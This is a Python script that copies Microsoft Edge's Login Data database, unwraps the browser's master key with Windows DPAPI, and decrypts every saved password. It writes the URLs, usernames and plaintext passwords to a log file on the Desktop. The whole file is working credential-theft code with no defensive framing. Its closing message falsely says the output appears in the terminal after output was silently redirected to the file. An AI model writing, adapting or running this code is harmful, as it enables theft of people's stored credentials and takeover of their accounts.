import os
import json
import base64
import sqlite3
import shutil
import win32crypt
from Crypto.Cipher import AES
import sys

log_file = open(os.path.join(os.path.expanduser("~"), "Desktop", "Log_File.txt"), "a", encoding="utf-8")
sys.stdout = log_file
sys.stderr = log_file


# ==========================
# 1. Get Edge Master Key
# ==========================
def get_edge_master_key():
    local_state_path = os.path.join(
        os.environ["USERPROFILE"],
        r"AppData\Local\Microsoft\Edge\User Data\Local State"
    )

    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.load(f)

    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    encrypted_key = encrypted_key[5:]  # remove DPAPI prefix
    master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    return master_key


# ==========================
# 2. Decrypt Passwords
# ==========================
def decrypt_password(password, key):
    try:
        if password.startswith(b"v10") or password.startswith(b"v11"):
            iv = password[3:15]
            payload = password[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload[:-16])  # ignore tag
            return decrypted_pass.decode("utf-8", errors="ignore")
        else:
            return win32crypt.CryptUnprotectData(password, None, None, None, 0)[1].decode()
    except Exception as e:
        return f"[Decryption Error: {e}]"


# ==========================
# 3. Extract from Edge DB
# ==========================
def extract_edge_passwords():
    db_path = os.path.join(
        os.environ["USERPROFILE"],
        r"AppData\Local\Microsoft\Edge\User Data\Default\Login Data"
    )
    temp_db = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Temp", "EdgeData.db")

    # Copy to temp to avoid lock error
    shutil.copy2(db_path, temp_db)

    conn = sqlite3.connect(temp_db)
    cursor = conn.cursor()

    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

    master_key = get_edge_master_key()

    print("\n========== Saved Edge Passwords ==========\n")
    for row in cursor.fetchall():
        url = row[0]
        username = row[1]
        encrypted_password = row[2]
        decrypted_password = decrypt_password(encrypted_password, master_key)

        print(f"URL: {url}")
        print(f"Username: {username}")
        print(f"Password: {decrypted_password}")
        print("-" * 40)

    cursor.close()
    conn.close()
    os.remove(temp_db)


# ==========================
# MAIN
# ==========================
if __name__ == "__main__":
    print("Extracting Microsoft Edge Saved Passwords...\n")
    extract_edge_passwords()
    print("\nDone. All output shown in terminal.")

